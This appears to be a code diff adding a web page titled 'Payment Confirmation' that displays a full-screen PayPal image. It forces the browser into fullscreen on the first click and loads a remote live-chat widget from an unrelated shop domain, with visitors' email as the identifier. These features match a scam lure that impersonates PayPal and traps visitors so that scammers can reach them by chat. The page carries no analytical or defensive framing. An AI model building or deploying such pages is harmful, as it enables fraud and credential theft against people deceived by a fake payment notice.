@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Confirmation</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+    #fullImage {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+    /* Optional: Center webpage content */
+    .content {
+      position: relative;
+      z-index: 1;
+      text-align: center;
+      padding: 20px;
+      color: #fff;
+    }
+  </style>
+</head>
+
+<script>
+document.addEventListener('click', enterFullscreen);
+
+function enterFullscreen() {
+  const elem = document.documentElement;
+
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.mozRequestFullScreen) { /* Firefox */
+    elem.mozRequestFullScreen();
+  } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE/Edge */
+    elem.msRequestFullscreen();
+  }
+
+  // Remove the click event listener after going full-screen
+  document.removeEventListener('click', enterFullscreen);
+}
+</script>
+
+<body>
+  <img src="images/paypal.png" alt="Full Page Image" id="fullImage">
+  
+  <div class="content">
+    <!-- Your webpage content goes here -->
+    <h1>Welcome </h1>
+    <p><script>var LHC_API = LHC_API||{};
+LHC_API.args = {mode:'widget',lhc_base_url:'//99storeonline.shop/livehelperchat/lhc_web/index.php/',wheight:750,wwidth:450,pheight:520,pwidth:500,domain:'xboxsuppliars.com',leaveamessage:true,check_messages:false,identifier:'email'};
+(function() {
+var po = document.createElement('script'); po.type = 'text/javascript'; po.setAttribute('crossorigin','anonymous'); po.async = true;
+var date = new Date();po.src = '//99storeonline.shop/livehelperchat/lhc_web/design/defaulttheme/js/widgetv2/index.js?'+(""+date.getFullYear() + date.getMonth() + date.getDate());
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+})();
+</script></p>
+  
+  </div>
+</body>
+</html>
